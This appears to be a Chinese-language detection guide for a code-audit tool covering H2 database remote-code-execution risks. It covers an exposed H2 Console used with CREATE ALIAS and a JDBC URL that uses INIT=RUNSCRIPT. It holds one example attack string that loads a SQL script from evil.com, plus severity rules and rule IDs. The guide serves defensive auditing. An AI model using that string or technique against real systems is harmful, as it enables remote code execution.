# H2 数据库 RCE 判断知识

H2 嵌入式数据库的两类高危 RCE 路径：
1. **H2 Console 未授权访问**：`spring.h2.console.enabled=true` 且无认证，攻击者通过 `/h2-console` 执行 `CREATE ALIAS` 调用 Java 代码
2. **JDBC URL INIT 脚本**：`jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil.com/x.sql'`

## 查询结果说明

| 文件 | 含义 |
|------|------|
| `h2_console.json` | 代码中 H2 Console 引用 |
| `h2_init_script.json` | JDBC URL 中含 INIT/RUNSCRIPT 参数 |
| `h2_datasource.json` | H2 数据源配置 |

## 判断规则

| 场景 | 严重度 |
|------|--------|
| H2 Console 启用 + 无认证 + H2 < 2.x | **CRITICAL** |
| H2 Console 启用 + 有认证但版本 < 2.x | **HIGH** |
| JDBC URL 含 INIT/RUNSCRIPT 参数 | **CRITICAL** |
| 仅测试目录中 H2 配置 | **MEDIUM** |

结合 tech_profile 依赖版本判断。若仅在 `test/` 目录下发现，风险降低。

`rule_id` 命名：`h2-console-exposed`、`h2-init-script`。

**build-mode=none 限制**：Sink 参数为非字面量表达式即可上报。
